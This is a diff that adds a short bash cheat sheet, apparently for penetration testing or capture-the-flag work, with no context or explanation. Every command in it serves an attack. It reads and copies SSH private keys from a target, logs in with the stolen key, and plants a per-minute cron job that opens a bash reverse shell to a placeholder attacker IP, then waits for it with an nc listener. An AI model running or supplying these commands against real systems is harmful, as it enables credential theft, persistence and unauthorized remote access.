@@ -1,0 +1,22 @@
+
+```bash
+ls -lah ~/.ssh/
+cat ~/.ssh/id_rsa
+cat ~/.ssh/authorized_keys
+cat ~/.ssh/known_hosts
+
+# Download the 'id_rsa' file
+scp <USER>@<TARGET_IP>:~/.ssh/id_rsa .
+chmod 400 id_rsa
+
+ssh -i id_rsa <USER>@<TARGET_IP>
+
+# Cron Jobs
+cat /etc/cron*
+echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1'" > cron
+crontab -i cron
+crontab -l
+
+# Setup a 'nc' listener and wait for the Bash Reverse Shell
+nc -nvlp <PORT>
+```
